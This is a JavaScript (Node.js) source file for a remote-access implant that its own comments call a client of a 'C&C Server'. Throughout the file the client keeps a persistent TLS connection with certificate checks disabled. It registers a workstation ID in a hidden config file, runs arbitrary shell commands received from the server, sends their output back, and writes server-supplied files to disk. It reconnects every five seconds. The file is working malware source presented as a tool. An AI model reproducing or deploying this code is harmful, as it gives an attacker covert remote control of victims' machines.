"use strict";
const tls = require('tls')
const fs = require('fs')
const child = require('child_process')
const { exec } = require('child_process');

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 */
const _options = {
    key: fs.readFileSync(__dirname + '/certs/host.key'),
    cert: fs.readFileSync(__dirname + '/certs/host.crt'),
    rejectUnauthorized: false
}

// flag variable to let the client know if it needs to reconnect to the server
const _fsPort = 2223 // File socket port
const _comPort = 443 // Communication Socket port
const _host = '127.0.0.1' // C&C Server
const _shellType = "sh" //cmd.exe, zsh, sh
const _EOT_ = '|||' // Characters to identify end of transmission per write (not per packet)
const _CONFIG_PATH_ = '/.RSconf'
// ===========================================================================

// Global variables
var comAlive = false
var workstationId
var buffer = ''
var fileStream = {}
// ===========================================================================

const readConfig = (configPath) => {
    try {
        var configData = fs.readFileSync(__dirname + _CONFIG_PATH_)
        configData = JSON.parse(configData)
        workstationId = configData.id
    } catch (e) {
        console.log(`No Config Found: ${e}`)
    }
}

const sendClientConfig = (serverSocket) => {
    var msg = {
        'type': 'existingClient',
        'id': workstationId
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

const setupConfig = (JBuffer) => {
    try {
        fs.writeFileSync(__dirname + _CONFIG_PATH_, JSON.stringify(JBuffer))
        workstationId = JBuffer.id
    } catch (e) {
        console.log(`Error saving config: ${e}`)
    }
}

const setupRequest = (serverSocket) => {
    var msg = {
        'type': 'setupRequest'
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

const execCommand = (JBuffer, serverSocket) => {

    exec(JBuffer.data, {
        timeout: 30000,
    },(error, stdout, stderr) => {
        if (error) {
            console.log('here')

            var msg = {
                'type': 'execResponse',
                'data': String(error)
            }
            serverSocket.write(JSON.stringify(msg) + _EOT_)
            return
        }
        var msg = {
            'type': 'execResponse',
            'data': stdout
        }
        console.log(msg)
        serverSocket.write(JSON.stringify(msg) + _EOT_)
    })
}

const echoTest = (JBuffer, serverSocket) => {
    var msg = {
        'type': 'echo',
        'data': JBuffer.data
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

const initWriteFile = (JBuffer) => {
    fileStream = fs.createWriteStream(JBuffer.data)
}

const dataWriteFile = (JBuffer) => {
    fileStream.write(JBuffer.data)
}

const endWriteFile = () => {
    fileStream.close()
}

const bufferInterpreter = (JBuffer, serverSocket) => {
    switch (JBuffer.type) {
        case 'setup':
            setupConfig(JBuffer)
            break
        case 'echo':
            echoTest(JBuffer, serverSocket)
            break
        case 'exec':
            execCommand(JBuffer, serverSocket)
            break
        case 'fileServerToClient':
            initWriteFile(JBuffer)
            break
        case 'fileData':
            dataWriteFile(JBuffer)
            break
        case 'endOfFile':
            endWriteFile()
            break;
    }
}

// async await wrapper to make certain functions async
const asyncCall = (callback) => new Promise((resolve) => {
    callback(resolve)
})

/**
 * creates a connection to a communication socket server.
 * connection is persistant and will attempt to reconnect every 5s
 * @param {number} PORT 
 * @param {string} HOST 
 * @param {object} tlsCerts 
 * @returns socket
 */
const comServerConnect = (PORT, HOST, tlsCerts) => {
    const serverSocket = tls.connect(PORT, HOST, tlsCerts)

    // On Successful TLS socket connection, spawn shell
    serverSocket.on('secure', async () => {
        // comAlive = true
        console.log(`Connected to port ${PORT}`)

        if (workstationId == undefined) {
            setupRequest(serverSocket)
        } else {
            sendClientConfig(serverSocket)
        }

        // fsClient = await asyncCall((resolve) => {
        //     return fsServerConnect(_fsPort, _host, _options, client, resolve)
        // })
        // shellSpawn(client)
    })

    serverSocket.on('data', (data) => {
        var dataString = data.toString()
        var endOfTransmissionIndex = dataString.indexOf('|||')
        if (endOfTransmissionIndex > 0) {
            buffer += dataString.substr(0, endOfTransmissionIndex)

            console.log(buffer)
            var JBuffer
            try {
                JBuffer = JSON.parse(buffer)
                bufferInterpreter(JBuffer, serverSocket)
            } catch (e) {
                console.log('Buffer was messed up... try again') //SEND MESSAGE TO SERVER
                JBuffer = ''
                buffer = ''
            }
            
            buffer = ''
        } else {
            buffer += data
        }
    })

    // On socket close, attempt to reconnect
    serverSocket.on('close', () => {
        comAlive = false
        console.log(`${PORT} connection closed... reconnecting...`)
        // fsClient.destroy()
        serverSocket.destroy()
        setTimeout(() => {
            comServerConnect(PORT, HOST, tlsCerts)
        }, 5000)
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    serverSocket.on('error', (error) => {
        comAlive = false
        console.log(error)
        // fsClient.destroy()
        serverSocket.destroy()
    })

    return serverSocket
}

readConfig(_CONFIG_PATH_)
comServerConnect(_comPort, _host, _options)
